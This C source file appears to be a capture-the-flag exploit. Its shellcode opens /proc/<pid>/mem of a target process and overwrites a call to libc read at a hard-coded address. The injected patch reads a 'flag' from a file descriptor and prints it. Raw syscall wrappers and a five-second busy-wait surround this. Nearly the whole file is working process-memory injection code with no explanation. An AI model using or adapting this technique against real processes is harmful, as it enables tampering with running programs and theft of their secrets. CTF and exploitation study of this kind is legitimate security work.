#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "shellcode.h"

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_lseek 8
#define __NR_mmap 9
#define __NR_mprotect 10
#define __NR_brk 12
#define __NR_sched_yield 24
#define __NR_gettimeofday 96

__attribute__((always_inline)) static inline long
_syscall(int number, long arg1, long arg2, long arg3, long arg4, long arg5,
         long arg6) {
  register int rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall\n"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

__attribute__((always_inline)) static inline ssize_t _read(int fd, void *buf,
                                                           size_t count) {
  return _syscall(__NR_read, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline ssize_t
_write(int fd, const void *buf, size_t count) {
  return _syscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline int _open(const char *pathname,
                                                       int flags, mode_t mode) {
  return _syscall(__NR_open, (long)pathname, flags, mode, 0, 0, 0);
}

__attribute__((always_inline)) static inline off_t _lseek(int fd, off_t offset,
                                                          int whence) {
  return _syscall(__NR_lseek, fd, offset, whence, 0, 0, 0);
}

__attribute__((always_inline)) static inline void *
_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
  return (void *)_syscall(__NR_mmap, (long)addr, length, prot, flags, fd,
                          offset);
}

__attribute__((always_inline)) static inline int
_mprotect(void *addr, size_t len, int prot) {
  return _syscall(__NR_mprotect, (long)addr, len, prot, 0, 0, 0);
}

__attribute__((always_inline)) static inline void *_brk(void *addr) {
  return (void *)_syscall(__NR_brk, (long)addr, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int _sched_yield(void) {
  return _syscall(__NR_sched_yield, 0, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int
_gettimeofday(struct timeval *tv, struct timezone *tz) {
  return _syscall(__NR_gettimeofday, (long)tv, (long)tz, 0, 0, 0, 0);
}

extern char patch_start[];
extern char patch_end[];

__attribute__((section(".text.shellcode"), used)) static void shellcode(void) {
  /*
  40227a:       89 c7                   mov    %eax,%edi
  40227c:       e8 6f da 04 00          callq  44fcf0 <__libc_read>
  */
  int fd = _open("/proc/" PID_STR "/mem", O_WRONLY, 0);
  _lseek(fd, 0x40227c, SEEK_SET);
  _write(fd, patch_start, patch_end - patch_start);

  struct timeval tv;
  _gettimeofday(&tv, NULL);
  long deadline_usec = (tv.tv_sec + 5) * 1000000 + tv.tv_usec;
  while (1) {
    _gettimeofday(&tv, NULL);
    if (tv.tv_sec * 1000000 + tv.tv_usec > deadline_usec)
      break;
    _sched_yield();
  }
}

__attribute__((section(".text.patch"), used)) static void patch(int fd) {
  char flag[128];
  _read(fd, flag, sizeof(flag));
  _write(STDOUT_FILENO, flag, sizeof(flag));
}
